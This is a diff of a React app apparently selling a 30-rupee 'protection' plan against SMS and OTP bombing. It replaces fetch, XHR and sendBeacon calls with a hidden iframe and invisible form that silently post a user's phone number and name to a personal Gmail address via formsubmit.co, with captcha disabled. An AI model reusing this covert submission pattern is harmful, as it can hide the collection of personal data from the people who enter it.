@@ -76,68 +76,44 @@ function App() {
     );
   };
 
-  const sendEmail = async (data) => {
-    // Method 1: fetch with FormData (most reliable)
-    try {
-      const formData = new FormData();
-      Object.keys(data).forEach(key => formData.append(key, data[key]));
-      
-      const res = await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
-        method: 'POST',
-        body: formData,
-      });
-      // Don't parse JSON - just check if request was sent
-      return true;
-    } catch (e) {
-      console.log('Method 1 failed, trying method 2...');
-    }
+  const sendEmail = (data) => {
+    // Create hidden iframe to receive form submission
+    const iframe = document.createElement('iframe');
+    iframe.name = 'hidden_iframe_' + Date.now();
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
 
-    // Method 2: XMLHttpRequest (works even when fetch fails)
-    try {
-      return await new Promise((resolve) => {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://formsubmit.co/ajax/collab.apkboy95@gmail.com', true);
-        xhr.setRequestHeader('Accept', 'application/json');
-        
-        const params = new URLSearchParams();
-        Object.keys(data).forEach(key => params.append(key, data[key]));
-        
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            resolve(true);
-          }
-        };
-        xhr.onerror = function() {
-          resolve(false);
-        };
-        
-        xhr.send(params.toString());
-        
-        // Timeout after 5 seconds
-        setTimeout(() => resolve(true), 5000);
-      });
-    } catch (e) {
-      console.log('Method 2 failed, trying method 3...');
-    }
+    // Create hidden form
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://formsubmit.co/collab.apkboy95@gmail.com';
+    form.target = iframe.name;
+    form.style.display = 'none';
 
-    // Method 3: sendBeacon (last resort)
-    try {
-      const formData = new FormData();
-      Object.keys(data).forEach(key => formData.append(key, data[key]));
-      navigator.sendBeacon('https://formsubmit.co/collab.apkboy95@gmail.com', formData);
-      return true;
-    } catch (e) {
-      console.error('All email methods failed:', e);
-      return false;
-    }
+    // Add all data fields
+    Object.keys(data).forEach(key => {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = key;
+      input.value = data[key];
+      form.appendChild(input);
+    });
+
+    document.body.appendChild(form);
+    
+    // Submit form
+    form.submit();
+    
+    // Clean up after 3 seconds
+    setTimeout(() => {
+      document.body.removeChild(form);
+      document.body.removeChild(iframe);
+    }, 3000);
   };
 
-  const handlePremiumActivate = async () => {
+  const handlePremiumActivate = () => {
     if (premiumPhone.length === 10 && premiumName.trim().length > 0 && selectedProtections.length > 0) {
       setPremiumLoading(true);
-
-      // Small delay to ensure all state is settled
-      await new Promise(resolve => setTimeout(resolve, 500));
 
       // Prepare all data
       const protectionLabels = { sms: 'SMS Bombing', otp: 'OTP Bombing', whatsapp: 'WhatsApp Spam', calls: 'Phone Calls' };
@@ -151,18 +127,12 @@ function App() {
         'Plan': 'Premium Protector - 30 Rupees (1 Year)',
         'Activated On': new Date().toLocaleString(),
         '_subject': 'NEW Premium Activation - ALLn1PROTECTOR',
-        '_template': 'boxit',
-        '_captcha': 'false'
+        '_captcha': 'false',
+        '_next': window.location.href
       };
 
-      // Send email with retry
-      const success = await sendEmail(emailData);
-      
-      // If first attempt fails, retry once after 1 second
-      if (!success) {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        await sendEmail(emailData);
-      }
+      // Send email using hidden form submission
+      sendEmail(emailData);
 
       setTimeout(() => {
         setPremiumLoading(false);
